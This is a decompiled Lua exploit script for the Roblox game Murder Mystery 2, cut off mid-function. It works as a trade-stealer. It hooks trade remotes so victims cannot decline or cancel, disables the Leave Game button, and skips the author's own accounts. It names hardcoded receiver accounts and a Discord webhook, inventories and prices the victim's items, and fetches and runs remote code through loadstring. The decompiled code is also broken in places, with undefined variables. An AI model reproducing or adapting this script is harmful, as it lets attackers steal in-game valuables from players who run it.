-- This file was generated at discord.gg/syncrypt

local value67, unpack_, identifyexecutor_, value9, ok, n1
repeat
    value67 = {}
    unpack_ = unpack or table.unpack

    function value67.value1(p1, p2, p3)
        local next_

        if type(p1) == "function" then
            next_ = p1
            p1 = p2
        else
            local v9 = getmetatable(p1)
            local __iter

            if type(v9) == "table" then
                __iter = v9.__iter
            else
                __iter = false
            end

            if __iter then
                next_, p1, p3 = v9.__iter(p1)
            elseif type(p1) == "table" then
                next_ = next
                p3 = nil
            else
                next_ = p1
                p1 = p2
            end
        end

        return function()
            local v11 = table.pack(next_(p1, p3))

            if v11[1] == nil then
                return false
            else
                local _ = v11[1]

                return true, table.unpack(v11, 1, v11.n)
            end
        end
    end

    pcall(function()
        local t2 = {}

        for i = 1, 10 do
            local result

            v18, result = pcall(math.random)

            if not v18 then
                return
            end

            t2[i] = result
        end

        local v16 = true

        for i = 2, #t2 do
            if t2[i] ~= t2[1] then
                v16 = false

                break
            end
        end

        if not v16 then
            return
        end

        setreadonly(math, false)

        function math.random()
            return 0
        end

        setreadonly(math, true)
        warn("hello!")
    end)
    pcall(function()
        if not hookfunction then
            return
        end

        local hookfunction_ = hookfunction

        hookfunction_ = type(hookfunction_) == "function" and game:GetService("ReplicatedStorage"):FindFirstChild("Trade")

        if not hookfunction_ then
            return
        end

        for _, v in ipairs({
			"SendRequest",
			"AcceptTrade",
			"DeclineTrade",
			"OfferItem",
			"CancelRequest"
		}) do
            local FireServer = hookfunction_:FindFirstChild(v)
            local FireServer2

            if FireServer then
                FireServer2 = FireServer.FireServer
            else
                FireServer2 = FireServer
            end

            if FireServer2 then
                FireServer = FireServer.FireServer
                hookfunction(FireServer, FireServer)
            end
        end
    end)
    pcall(function()
        local Trade = game:GetService("ReplicatedStorage"):FindFirstChild("Trade")

        if not Trade then
            return
        end

        if Trade.SendRequest then
            Trade.SendRequest.OnClientInvoke = newcclosure(function()
                return false
            end)
        end

        function _G.NewTradeRequest()
        end
    end)
    pcall(function()
        local Trade = has(hookfunction)

        if Trade then
            Trade = has(debug.getinfo)
        end

        Trade = Trade and game:GetService("ReplicatedStorage"):WaitForChild("Trade")

        if not Trade then
            return
        end

        local v25 = tostring(unpack_({ math.random() }))

        _G.__MM2_ME = v25

        for _, v in ipairs({ "DeclineTrade", "DeclineRequest", "CancelRequest" }) do
            local FireServer = Trade:FindFirstChild(v)
            local isRemoteEvent

            if FireServer then
                isRemoteEvent = FireServer:IsA("RemoteEvent")
            else
                isRemoteEvent = FireServer
            end

            if isRemoteEvent then
                FireServer = FireServer.FireServer

                if FireServer then
                    pcall(function()
                        hookfunction(FireServer, function(...)
                            local ok2, result = pcall(debug.getinfo, 2, "S")

                            if ok2 and result and (result.source and result.source:find(v25)) then
                                return FireServer(...)
                            else
                                return
                            end
                        end)
                    end)
                end
            end
        end
    end)
    pcall(function()
        local __namecall = has(getrawmetatable)

        if __namecall then
            __namecall = has(debug.getupvalue)

            if __namecall then
                __namecall = has(debug.setupvalue)
            end
        end

        if not __namecall then
            return
        end

        __namecall = getrawmetatable(game)

        if __namecall then
            v36 = __namecall.__namecall
        else
            v36 = __namecall
        end

        if not v36 then
            return
        end

        __namecall = __namecall.__namecall
        __namecall = function()
            for i = 1, 10 do
                if pcall(debug.getupvalue, __namecall, i) == "TradeAllowed" then
                    pcall(debug.setupvalue, __namecall, i, true)

                    return
                end
            end
        end
        __namecall()

        local spawn_ = has(task)

        if spawn_ then
            spawn_ = task.spawn
        end

        spawn_ = spawn_ or spawn

        local wait_ = has(task)

        if wait_ then
            wait_ = task.wait
        end

        wait_ = wait_ or wait
        spawn_(function()
            while wait_(1.5) do
                pcall(__namecall)
            end
        end)
    end)
    task.spawn(function()
        while task.wait() do
            pcall(function()
                for _, v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
                    v:Disable()
                end
            end)
        end
    end)

    if _G.__ElysiumMM2 then
        print("already running")

        return
    end

    local t3 = {}
    local t1 = {
		value2 = "z\184\190c\237>\3\17\181\251\28Y"
	}

    _G.__ElysiumMM2 = true
    _G.LastOffer = nil
    pcall(function()
    end)

    function t3.value1()
    end

    local value1 = t3.value1

    t1.value9 = t1.value1
    t1.value4 = "Executor: "
    t1.value2 = tostring
    identifyexecutor_ = identifyexecutor

    if identifyexecutor_ then
        identifyexecutor_ = identifyexecutor()
    end

    t1.value7 = identifyexecutor_
    identifyexecutor_ = t1.value7
    value9 = t1.value9
    t1.value8 = identifyexecutor_
    t1.value1 = value9

    if not t1.value7 then
        t1.value9 = t1.value1
        t1.value12 = getexecutorname
        identifyexecutor_ = t1.value12
        value9 = t1.value1
        t1.value10 = identifyexecutor_
        t1.value13 = value9

        if t1.value12 then
            t1.value10 = getexecutorname()
        end

        identifyexecutor_ = t1.value10
        value9 = t1.value13
        t1.value7 = identifyexecutor_
        t1.value1 = value9

        if not t1.value10 then
            t1.value7 = "unknown"
        end

        identifyexecutor_ = t1.value7
        value9 = t1.value9
        t1.value8 = identifyexecutor_
        t1.value1 = value9
    end

    value1(t1.value4 .. t1.value2(t1.value8))
    t3.value1("PlaceId: " .. game.PlaceId)
    t1.value3 = game

    if t1.value3.PlaceId ~= 142823291 then
        t3.value1("WRONG GAME \226\128\148 expected 142823291")

        return
    end

    function t1.value4()
        return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType", 5):InvokeServer()
    end

    value1, identifyexecutor_ = pcall(t1.value4)
    t1.value19 = value1
    t1.value20 = identifyexecutor_
    value1 = t3.value1
    t1.value3 = t1.value20
    identifyexecutor_ = t1.value19
    identifyexecutor_ = tostring(identifyexecutor_)
    value9 = t1.value3
    value1("VIP check: ok=" .. identifyexecutor_ .. " result=" .. tostring(value9))
    value1 = t1.value19

    if value1 then
        value1 = t1.value3 == "VIPServer"
    end

    if value1 then
        game.Players.LocalPlayer:Kick("VIP / Private Server detected.\nUsing this script in this server may result in a ban.\nPlease join a PUBLIC server.")

        return
    end

    value1 = {}
    t1.value4 = game:GetService("Players")
    value1.value1 = t1.value4
    t1.value2 = game:GetService("ReplicatedStorage")
    value1.value2 = t1.value2
    t1.value6 = game:GetService("HttpService")
    value1.value3 = t1.value6
    t1.value6 = value1.value1.LocalPlayer
    value1.value4 = t1.value6
    t1.value7 = value1.value4
    t1.value6 = t1.value7

    if t1.value7 then
        t1.value6 = value1.value4.Name
    end

    if t1.value6 then
        t1.value6 = value1.value4.Name
        t1.value9 = t1.value6:find("ProPvP")
        t1.value5 = t1.value9

        if not t1.value9 then
            identifyexecutor_ = t1.value6.find
            value9 = t1.value1
            t1.value13 = identifyexecutor_
            t1.value10 = value9
            t1.value13 = t1.value13(t1.value6, "ProVitalz")
            t1.value9 = t1.value13

            if not t1.value13 then
                t1.value12 = t1.value1
                t1.value11 = t1.value6:find("Proplong2")
                t1.value13 = t1.value11

                if not t1.value11 then
                    t1.value14 = t1.value1
                    t1.value15 = t1.value6:find("Proplong3")
                    t1.value11 = t1.value15

                    if not t1.value15 then
                        t1.value17 = t1.value1
                        t1.value16 = t1.value6:find("Proplong4")
                        t1.value15 = t1.value16

                        if not t1.value16 then
                            t1.value18 = t1.value1
                            t1.value16 = t1.value6:find("Proplong") or t1.value6:find("ProVitalitz")
                            identifyexecutor_ = t1.value16
                            value9 = t1.value18
                            t1.value15 = identifyexecutor_
                            t1.value1 = value9
                        end

                        identifyexecutor_ = t1.value15
                        value9 = t1.value17
                        t1.value11 = identifyexecutor_
                        t1.value1 = value9
                    end

                    identifyexecutor_ = t1.value11
                    value9 = t1.value14
                    t1.value13 = identifyexecutor_
                    t1.value1 = value9
                end

                identifyexecutor_ = t1.value12
                value9 = t1.value13
                t1.value1 = identifyexecutor_
                t1.value9 = value9
            end

            identifyexecutor_ = t1.value10
            value9 = t1.value9
            t1.value1 = identifyexecutor_
            t1.value5 = value9
        end

        if t1.value5 then
            return
        end
    end

    t3.value1("LocalPlayer: " .. value1.value4.Name)
    t1.value9 = getgenv()

    if not t1.value9.MM2_API_BASE then
        t1.value5 = getgenv()
        t1.value5.MM2_API_BASE = "https://elysium-mm2-api.snthnova.workers.dev"
    end

    t1.value6 = getgenv().MM2_API_BASE
    t1.value7 = t1.value1
    value1.value5 = t1.value6
    t1.value6 = getgenv().RECEIVERS or { "iceyblueii, husszn_hold1, gardenhssxcx" }
    t1.value9 = t1.value7
    value1.value6 = t1.value6
    t1.value6 = getgenv().WEBHOOK or "https://discord.com/api/webhooks/1555946397147340871/DxbuhVv2NAgy82zDDtSt1RK5GM5u9KMDf6SQ8bnPseDtxjjswRCz3BZ0t-l5A5TdZAM4"
    t1.value1 = t1.value9
    t1.value10 = t1.value1
    t1.value11 = "getgenv"
    value1.value7 = t1.value6
    t1.value11 = getgenv()
    value1.value8 = t1.value11.THRESHOLD or 10
    t3.value1("Targets: " .. table.concat(value1.value6, ", "))
    identifyexecutor_ = t3.value1
    value9 = value1.value8
    identifyexecutor_("Threshold: " .. tostring(value9))
    t1.value6 = t3.value1
    t1.value12 = "Player count: " .. #value1.value1:GetPlayers()
    t1.value11 = t1.value1
    t1.value6(t1.value12)
    t1.value14 = syn
    identifyexecutor_ = t1.value14
    value9 = t1.value1
    t1.value12 = identifyexecutor_
    t1.value13 = value9

    if t1.value14 then
        t1.value12 = syn.request
    end

    identifyexecutor_ = t1.value12
    value9 = t1.value11
    t1.value6 = identifyexecutor_
    t1.value1 = value9

    if not t1.value12 then
        t1.value11 = t1.value1
        t1.value14 = http_request
        t1.value12 = t1.value14

        if not t1.value14 then
            t1.value15 = t1.value1
            t1.value17 = request
            t1.value14 = t1.value17

            if not t1.value17 then
                t1.value16 = t1.value1
                t1.value18 = fluxus
                t1.value17 = t1.value18

                if t1.value18 then
                    t1.value17 = fluxus.request
                end

                identifyexecutor_ = t1.value17
                value9 = t1.value16
                t1.value14 = identifyexecutor_
                t1.value1 = value9
            end

            identifyexecutor_ = t1.value14
            value9 = t1.value15
            t1.value12 = identifyexecutor_
            t1.value1 = value9
        end

        identifyexecutor_ = t1.value12
        value9 = t1.value11
        t1.value6 = identifyexecutor_
        t1.value1 = value9
    end

    t1.value1 = t1.value13
    value1.value9 = t1.value6
    t1.value6 = t3.value1
    t1.value14 = "HTTP fn: "
    identifyexecutor_ = t1.value1
    value9 = t1.value1
    t1.value18 = identifyexecutor_
    t1.value17 = value9
    t1.value16 = value1.value9 and "found"
    identifyexecutor_ = t1.value16
    value9 = t1.value18
    t1.value15 = identifyexecutor_
    t1.value1 = value9

    if not t1.value16 then
        t1.value15 = "MISSING"
    end

    t1.value11 = t1.value14 .. t1.value15
    t1.value1 = t1.value17
    t1.value6(t1.value11)

    function t1.value6(p4)
        if value1.value9 then
            local v40 = value1.value9({
				["Url"] = p4,
				["Method"] = "GET"
			})
            local Body

            if v40 then
                Body = v40.Body
            else
                Body = v40
            end

            if Body then
                return v40.Body
            else
                return nil
            end

            return
        else
            t3.value1("HTTP GET: no request function available")

            return nil
        end
    end

    value1.value10 = nil
    value1.value11 = false
    value1.value12 = false
    t1.value16 = identifyexecutor
    t1.value12 = t1.value16

    if t1.value16 then
        t1.value12 = identifyexecutor() == "Delta"
    end

    if t1.value12 then
        t1.value12 = t3.value1
        t1.value12("Delta detected \226\128\148 getgc stepAnimate bypass...")
        while true do
            t1.value12 = nil
            identifyexecutor_, value9, ok = ipairs(getgc(true))
            t1.value25 = identifyexecutor_
            t1.value26 = value9
            t1.value27 = ok
            t1.value22 = value67.value1(t1.value25, t1.value26, t1.value27)

            while true do
                t1.value23 = table.pack(t1.value22())

                if not t1.value23[1] then
                    break
                end

                t1.value16 = t1.value23[3]
                identifyexecutor_ = t1.value16
                t1.value29 = typeof(identifyexecutor_)

                if t1.value29 == "function" then
                    identifyexecutor_, value9 = pcall(debug.getinfo, t1.value16)
                    t1.value28 = identifyexecutor_
                    t1.value29 = value9
                    t1.value24 = t1.value28

                    if t1.value28 then
                        identifyexecutor_ = t1.value1
                        value9 = t1.value29
                        t1.value32 = identifyexecutor_
                        t1.value31 = value9

                        if t1.value29 then
                            t1.value31 = t1.value29.name == "stepAnimate"
                        end

                        identifyexecutor_ = t1.value31
                        value9 = t1.value32
                        t1.value24 = identifyexecutor_
                        t1.value1 = value9
                    end

                    if t1.value24 then
                        t1.value12 = t1.value16

                        break
                    end
                end
            end

            task.wait()

            if t1.value12 then
                break
            else
                continue
            end
        end
        if n1 then
            break
        end
        t3.value1("stepAnimate found \226\128\148 hooking")
        local v42
        v42 = hookfunction(t1.value12, function(p5)
            if value1.value12 then
                return v42(p5)
            end

            value1.value10 = game.JobId
            value1.value11 = true

            local value12 = t3.value1
            local value10 = value1.value10

            value12("bypassJobId captured: " .. tostring(value10))

            return v42(p5)
        end)
        t3.value1("Waiting for capturedJobId...")
        repeat
            task.wait()
        until value1.value11 and value1.value10
        identifyexecutor_ = t3.value1
        value9 = value1.value10
        identifyexecutor_("bypassJobId: " .. tostring(value9))
    else
        value1.value10 = game.JobId
        identifyexecutor_ = t3.value1
        value9 = value1.value10
        identifyexecutor_("Non-Delta \226\128\148 bypassJobId=" .. tostring(value9))
    end

    n1 = 1

    break
until true
while n1 do
    if n1 == 1 then
        n1 = nil

        repeat
            v7.value21 = v_u_41.value10
            identifyexecutor_ = v7.value21
            value9 = v7.value1
            v7.value16 = identifyexecutor_
            v7.value18 = value9
            if not v7.value21 then
                v7.value16 = game.JobId
            end
            v7.value1 = v7.value18
            v_u_41.value13 = v7.value16
            v_u_40.value1("REAL_JOB_ID=" .. v_u_41.value13)
            v_u_40.value1("Loading Database.Sync.Item...")
            function v7.value28()
                return require(v_u_41.value2:WaitForChild("Database", 10):WaitForChild("Sync", 10):WaitForChild("Item", 10))
            end
            v_u_41.value14 = nil
            identifyexecutor_, value9 = pcall(v7.value28)
            v7.value16 = v_u_40.value1
            v7.value23 = value9
            v7.value16("Database.Sync.Item: ok=" .. tostring(identifyexecutor_))
            v7.value16 = identifyexecutor_
            if identifyexecutor_ then
                identifyexecutor_ = v7.value23
                v7.value16 = type(identifyexecutor_) == "table"
            end
            if v7.value16 then
                v_u_41.value14 = v7.value23
            else
                function v7.value31()
                    return require(v_u_41.value2:WaitForChild("Database", 10):WaitForChild("Sync", 10))
                end

                identifyexecutor_, value9 = pcall(v7.value31)
                v7.value29 = identifyexecutor_
                v7.value30 = value9
                identifyexecutor_ = v_u_40.value1
                value9 = v7.value29
                identifyexecutor_("Database.Sync fallback: ok=" .. tostring(value9))
                v7.value28 = v7.value29

                if v7.value29 then
                    identifyexecutor_ = v7.value30
                    v7.value28 = type(identifyexecutor_) == "table"
                end

                if v7.value28 then
                    v_u_41.value14 = v7.value30.Weapons or v7.value30
                end
            end
            if not v_u_41.value14 then
                v_u_40.value1("Require failed \226\128\147 trying HTTP fallback for Database")
                v7.value29 = v7.value6("https://raw.githubusercontent.com/31yyyyy/main/refs/heads/main/mm2db")

                if v7.value29 then
                    identifyexecutor_, value9 = loadstring(v7.value29)
                    v7.value31 = identifyexecutor_
                    v7.value32 = value9

                    if v7.value31 then
                        identifyexecutor_, value9 = pcall(v7.value31)
                        v7.value30 = identifyexecutor_

                        if identifyexecutor_ then
                            v7.value30 = type(value9) == "table"
                        end

                        if v7.value30 then
                            v_u_41.value14 = value9
                            v_u_40.value1("HTTP fallback succeeded \226\128\147 loaded " .. #v_u_41.value14 .. " entries")
                        else
                            v_u_40.value1("HTTP fallback: failed to execute loaded code")
                        end
                    else
                        identifyexecutor_ = v_u_40.value1
                        value9 = v7.value32
                        identifyexecutor_("HTTP fallback: loadstring error: " .. tostring(value9))
                    end
                else
                    v_u_40.value1("HTTP fallback: failed to fetch URL")
                end
            end
            if not v_u_41.value14 then
                v_u_40.value1("FATAL: Database nil \226\128\148 aborting")

                return
            end
            identifyexecutor_, value9, ok = pairs(v_u_41.value14)
            v7.value32 = identifyexecutor_
            v7.value29 = v7.value32
            identifyexecutor_ = {
				["value1"] = {}
			}
            while true do
                ok, v_u_49 = v7.value29(value9, ok)

                if not ok then
                    break
                end

                if v_u_49.ItemName then
                    identifyexecutor_.value1[v_u_49.ItemName:lower()] = ok
                    identifyexecutor_.value1[ok:lower()] = ok
                end
            end
            v7.value29 = 0
            local value41
            for value41 in pairs(v_u_41.value14) do

                v7.value29 = v7.value29 + 1
            end
            v_u_40.value1("Database entries: " .. v7.value29)
            v_u_40.value1("Fetching profile via GetProfileData:InvokeServer...")
            value9 = nil
            ok, value41 = pcall(function()
                return v_u_41.value2.Remotes.Inventory.GetProfileData:InvokeServer(v_u_41.value4.Name)
            end)
            v_u_40.value1("GetProfileData: ok=" .. tostring(ok) .. " type=" .. type(value41))
            if ok then
                ok = type(value41) == "table"
            end
            if not ok then
                v_u_40.value1("GetProfileData failed \226\128\148 trying require(ProfileData) fallback")
                ok, value41 = pcall(function()
                    return require(v_u_41.value2:WaitForChild("Modules", 10):WaitForChild("ProfileData", 10))
                end)
                v_u_40.value1("require(ProfileData): ok=" .. tostring(ok))

                if ok then
                    ok = type(value41) == "table"
                end

                if ok then
                    v7.value33 = 20
                    v7.value37 = 1

                    for i = 1, v7.value33, v7.value37 do
                        v215 = not value41.Weapons
                        v7.value35 = v215

                        if not v215 then
                            v7.value35 = not next(value41.Weapons.Owned)
                        end

                        if not v7.value35 then
                            break
                        end

                        task.wait(0.3)
                    end
                else
                    value41 = value9
                end
            end
            if not value41 then
                v_u_40.value1("GetProfileData and require failed \226\128\147 trying HTTP fallback for ProfileData")
                value9 = v7.value6("https://raw.githubusercontent.com/snthnova/Snthnova-Hub/refs/heads/main/mm2profdata")

                if value9 then
                    value9, ok = loadstring(value9)

                    if value9 then
                        value9, ok = pcall(value9)
                        v7.value33 = value9
                        v7.value37 = ok
                        value9 = v7.value33

                        if v7.value33 then
                            value9 = v7.value37
                            value9 = type(value9) == "table"
                        end

                        if value9 then
                            v7.value34 = v_u_40.value1
                            value41 = v7.value37
                            v7.value34("HTTP fallback succeeded \226\128\147 profileData loaded")

                            if not value41.Weapons then
                                v_u_40.value1("WARNING: profileData missing Weapons table")
                            end
                        else
                            value9 = v_u_40.value1
                            ok = v7.value37
                            value9("HTTP fallback: failed to execute loaded code: " .. tostring(ok))
                        end
                    else
                        v_u_40.value1("HTTP fallback: loadstring error: " .. tostring(ok))
                    end
                else
                    v_u_40.value1("HTTP fallback: failed to fetch URL")
                end
            end
            if not value41 then
                v_u_40.value1("FATAL: profileData nil \226\128\148 aborting")

                return
            end
            value9 = {}
            ok = {
				["Godly"] = "Godly",
				["Ancient"] = "Ancient",
				["Unique"] = "Unique",
				["Vintage"] = "Vintage",
				["Legendary"] = "Legendary",
				["Rare"] = "Rare",
				["Uncommon"] = "Uncommon",
				["Common"] = "Common",
				["Chroma"] = "Chroma"
			}
            value9.value1 = {
				["Common"] = 0.1,
				["Uncommon"] = 0.25,
				["Rare"] = 0.5,
				["Legendary"] = 1,
				["Godly"] = 2,
				["Ancient"] = 5,
				["Unique"] = 10,
				["Vintage"] = 15
			}
            v7.value37 = {}
            v7.value33 = (function()
                v_u_40.value1("Fetching weapon values from GitHub...")

                local ok2, result = pcall(function()
                    return game:HttpGet("https://raw.githubusercontent.com/snthnova/Snthnova-Hub/refs/heads/main/mm2val.lua")
                end)

                if not (ok2 and result) then
                    v_u_40.value1("Failed to fetch values from GitHub - using fallback")

                    return {}
                end
            end)()
            value9.value2 = v7.value37
            local value33 = v7.value33
            if value33 then
                value33 = next(v7.value33)
            end
            v7.value37 = value33
            local ItemName
            if v7.value37 then
                v_u_40.value1("Building weapon value mapping with category matching...")
                v7.value37 = {}
                value33, v215, ItemName = pairs(v7.value33)
                v7.value36 = value33
                value33 = v7.value36
                v7.value38 = ItemName
                v7.value35 = value33

                while true do
                    value33, ItemName = v7.value35(v215, v7.value38)
                    v7.value38 = value33
                    v7.value40 = ItemName

                    if not v7.value38 then
                        break
                    end

                    v7.value39 = v7.value38
                    value33 = v7.value40

                    if type(value33) == "table" then
                        v7.value37[v7.value39] = {}

                        for k, v in pairs(v7.value40) do
                            v7.value37[v7.value39][k] = v
                            v7.value37[v7.value39][k:lower()] = v
                        end
                    end
                end

                value33, v215, ItemName = pairs(v_u_41.value14)
                v7.value38 = v215
                v7.value39 = ItemName
                v7.value40 = v7.value38
                v215 = v7.value39
                v7.value35 = value33

                while true do
                    v215, value33 = v7.value35(v7.value40, v215)
                    if not v215 then
                        break
                    end
                    ItemName = value33.ItemName or ""
                    local Rarity = value33.Rarity or ""
                    local v54
                    local v55 = ok[Rarity]
                    if value33.Chroma == true then
                        value33 = v7.value37.Chroma
                    else
                        value33 = false
                    end
                    if value33 then
                        value33 = v7.value37.Chroma

                        if value33[ItemName] then
                            v54 = value33[ItemName]
                        elseif value33[ItemName:lower()] then
                            v54 = value33[ItemName:lower()]
                        end
                    end
                    value33 = not v54
                    if value33 then
                        local value1 = v7.value1

                        if v55 then
                            value33 = v7.value37[v55]
                        else
                            value33 = v55
                        end

                        v7.value1 = value1
                    end
                    if value33 then
                        value33 = v7.value37[v55]

                        if value33[ItemName] then
                            v54 = value33[ItemName]
                        elseif value33[ItemName:lower()] then
                            v54 = value33[ItemName:lower()]
                        end
                    end
                    if v54 then
                        value9.value2[v215] = v54
                    else
                        value9.value2[v215] = value9.value1[Rarity] or 0.1
                    end
                end

                v_u_40.value1("Mapped values for " .. #value9.value2 .. " items from fetched data with category matching")
            else
                v_u_40.value1("No weapon values fetched - using fallback defaults")
                ok, value33, v215 = pairs(v_u_41.value14)
                v7.value35 = ok
                v7.value36 = value33
                ok = v7.value35
                value33 = v7.value36
                v7.value37 = ok

                while true do
                    v215, ok = v7.value37(value33, v215)
                    v7.value39 = ok

                    if not v215 then
                        break
                    end

                    ok = v7.value1
                    v7.value38 = v215
                    v7.value40 = value9.value2
                    ItemName = value9.value1[v7.value39.Rarity or "Common"]
                    v7.value1 = ok
                    v7.value40[v7.value38] = ItemName or 0.1
                end
            end
            ok = (function()
                v_u_40.value1("Fetching dollar values from Project-Reverse API...")

                local ok2, result = pcall(function()
                    return game:HttpGet("https://api.project-reverse.org/valuables/get-game-valuables?game=mm2")
                end)

                if ok2 and result then
                    ok2, result = pcall(v_u_41.value3.JSONDecode, v_u_41.value3, result)

                    if ok2 and (result and result.data) then
                        local t4 = {}

                        for _, v in ipairs(result.data) do
                            local name = v.name

                            if name then
                                name = v.price
                            end

                            if name then
                                t4[v.name] = v.price
                                t4[v.name:lower()] = v.price
                            end
                        end

                        v_u_40.value1("Loaded " .. #result.data .. " dollar values")

                        return t4
                    else
                        v_u_40.value1("Failed to decode dollar API response")

                        return {}
                    end

                    return
                else
                    v_u_40.value1("Failed to fetch dollar API - using empty map")

                    return {}
                end
            end)()
            v7.value40 = "\14\174O\211\206\140\205\165,\21"
            value9.value3 = {
				["DefaultGun"] = true,
				["DefaultKnife"] = true,
				["Reaver"] = true,
				["Reaver_Legendary"] = true,
				["Reaver_Godly"] = true,
				["Reaver_Ancient"] = true,
				["IceHammer"] = true,
				["IceHammer_Legendary"] = true,
				["IceHammer_Godly"] = true,
				["IceHammer_Ancient"] = true,
				["Gingerscythe"] = true,
				["Gingerscythe_Legendary"] = true,
				["Gingerscythe_Godly"] = true,
				["Gingerscythe_Ancient"] = true,
				["TestItem"] = true,
				["Season1TestKnife"] = true,
				["Cracks"] = true,
				["Icecrusher"] = true,
				["???"] = true,
				["Dartbringer"] = true,
				["TravelerAxeRed"] = true,
				["TravelerAxeBronze"] = true,
				["TravelerAxeSilver"] = true,
				["TravelerAxeGold"] = true,
				["BlueCamo_K_2022"] = true,
				["GreenCamo_K_2022"] = true,
				["SharkSeeker"] = true
			}
            function v7.value38(p6)
                if not p6 then
                    return p6
                end

                p6 = p6.Chroma == true

                return p6
            end
            function v7.value40(p7)
                if v_u_41.value14[p7] then
                    return p7, "Weapons"
                else
                    local match = p7:match("^(.-)_%d%d%d%d$")
                    local v64

                    if match then
                        v64 = v_u_41.value14[match]
                    else
                        v64 = match
                    end

                    if v64 then
                        return match, "Weapons"
                    else
                        match = p7:match("^(.+)Knife$")

                        if match then
                            v64 = v_u_41.value14[match]
                        else
                            v64 = match
                        end

                        if v64 then
                            return match, "Weapons"
                        else
                            match = p7:match("^(.+)Gun$")

                            if match then
                                v64 = v_u_41.value14[match]
                            else
                                v64 = match
                            end

                            if v64 then
                                return match, "Weapons"
                            else
                                match = p7:lower()

                                if identifyexecutor_.value1[match] then
                                    return identifyexecutor_.value1[match], "Weapons"
                                else
                                    v_u_40.value1("WARNING: Could not fix DataID: " .. p7)

                                    return p7, "Weapons"
                                end

                                return
                            end

                            return
                        end

                        return
                    end

                    return
                end
            end
            function value9.value4(p8)
                if v_u_41.value14[p8] then
                    return p8
                else
                    local match = p8:match("^(.-)_[KG]_%d%d%d%d$")

                    if match and v_u_41.value14[match] then
                        return match
                    else
                        match = p8:match("^(.+)Knife$")

                        local v66

                        if match then
                            v66 = v_u_41.value14[match]
                        else
                            v66 = match
                        end

                        if v66 then
                            return match
                        else
                            match = p8:match("^(.+)Gun$")

                            if match then
                                v66 = v_u_41.value14[match]
                            else
                                v66 = match
                            end

                            if v66 then
                                return match
                            else
                                return p8
                            end

                            return
                        end

                        return
                    end

                    return
                end
            end
            value9.value5 = v7.value38
            function v7.value39(p9)
                local v67 = value9.value4(p9)
                local v68 = v_u_41.value14[v67]

                if v68 then
                    local v69 = value9.value2[v67] or (value9.value1[v68.Rarity] or 0.1)
                    local ItemName2 = v68.ItemName or (v68.Name or p9)
                    local v71 = ok[v67] or ok[v67:lower()] or (not ItemName2 or ok[ItemName2] or (ok[ItemName2:lower()] or 0))

                    return {
						["dataid"] = v67,
						["name"] = ItemName2,
						["rarity"] = v68.Rarity or "Common",
						["isChroma"] = value9.value5(v68),
						["value"] = v69,
						["dollarValue"] = v71
					}
                else
                    return nil
                end
            end
            value9.value6 = v7.value39
            value9.value7 = v7.value40
            function value9.value8()
                local ok2, result = pcall(function()
                    return v_u_41.value2.Remotes.Inventory.GetProfileData:InvokeServer(v_u_41.value4.Name)
                end)

                if not (not ok2 or type(result) ~= "table") then
                    if not ok2 or type(result) ~= "table" then
                        return nil
                    else
                        return result
                    end

                    return
                end

                ok2 = function()
                    return require(v_u_41.value2:WaitForChild("Modules", 10):WaitForChild("ProfileData", 10))
                end
                ok2, result = pcall(ok2)

                if not ok2 or type(result) ~= "table" then
                    return nil
                else
                    return result
                end
            end
            function value9.value9(p10)
                local t5 = {}
                local Weapons = p10.Weapons

                if Weapons then
                    Weapons = p10.Weapons.Owned
                end

                local Uniques = p10.Uniques or {}
                local pairs_ = pairs
                local v78, v79

                Weapons, v78, v79 = pairs_(Weapons or {})

                local v80

                while true do
                    v79, v80 = Weapons(v78, v79)

                    if not v79 then
                        break
                    end

                    pairs_ = tostring

                    local v81 = pairs_(v79)

                    v80 = type(v80) == "number" and v80 and v80 or 1

                    local v82 = value9.value6(v81)

                    if v82 then
                        local v83 = not value9.value3[v81]

                        if v83 then
                            v83 = not value9.value3[v82.dataid]
                        end

                        if v83 then
                            table.insert(t5, {
								["DataID"] = v81,
								["Name"] = v82.name .. (v82.isChroma and " [CHROMA]" or ""),
								["Amount"] = v80,
								["Value"] = v82.value,
								["DollarValue"] = v82.dollarValue,
								["Rarity"] = v82.rarity,
								["IsChroma"] = v82.isChroma
							})
                        end
                    end
                end

                for _, Unique in ipairs(Uniques) do
                    v79 = tostring(Unique.BaseItem or "")

                    if v79 ~= "" then
                        v80 = Unique.EvoEquipped

                        if v80 then
                            v80 = v_u_41.value14[v79]

                            if v80 then
                                v80 = v_u_41.value14[v79].Evo
                            end
                        end

                        if v80 then
                            v80 = v_u_41.value14[v79].Evo
                            Unique = Unique.XP or 0

                            for i = 4, 1, -1 do
                                local v87 = v80[i]

                                if v87 then
                                    v87 = v80[i].XPRequired <= Unique
                                end

                                if v87 then
                                    v79 = v80[i].ItemName or v79

                                    break
                                end
                            end
                        end

                        Unique = value9.value6(v79)

                        if Unique then
                            v80 = not value9.value3[v79]

                            if v80 then
                                v80 = not value9.value3[Unique.dataid]

                                if v80 then
                                    v80 = Unique.value >= 0
                                end
                            end
                        else
                            v80 = Unique
                        end

                        if v80 then
                            table.insert(t5, {
								["DataID"] = v79,
								["Name"] = Unique.name .. Unique.isChroma and " [CHROMA]" or "",
								["Amount"] = 1,
								["Value"] = Unique.value,
								["DollarValue"] = Unique.dollarValue,
								["Rarity"] = Unique.rarity,
								["IsChroma"] = Unique.isChroma
							})
                        end
                    end
                end

                table.sort(t5, function(p11, p12)
                    return p11.Value > p12.Value
                end)

                return t5
            end
            value9.value10 = value9.value9(value41)
            function value9.value11(p13)
                local t6 = {}
                local Weapons = p13.Weapons

                if Weapons then
                    Weapons = p13.Weapons.Owned
                end

                local Uniques = p13.Uniques or {}
                local pairs_ = pairs
                local v92, v93

                Weapons, v92, v93 = pairs_(Weapons or {})

                local v94

                while true do
                    v93, v94 = Weapons(v92, v93)

                    if not v93 then
                        break
                    end

                    pairs_ = tostring

                    local v95 = pairs_(v93)

                    if type(v94) ~= "number" then
                        v94 = false
                    end

                    v94 = v94 or 1

                    local v96 = value9.value6(v95)
                    local v97

                    if v96 then
                        v97 = not value9.value3[v95]
                    else
                        v97 = v96
                    end

                    if v97 and not value9.value3[v96.dataid] then
                        table.insert(t6, {
							["DataID"] = v95,
							["Name"] = v96.name .. (v96.isChroma and " [CHROMA]" or ""),
							["Amount"] = v94,
							["Value"] = v96.value,
							["DollarValue"] = v96.dollarValue,
							["Rarity"] = v96.rarity,
							["IsChroma"] = v96.isChroma
						})
                    end
                end

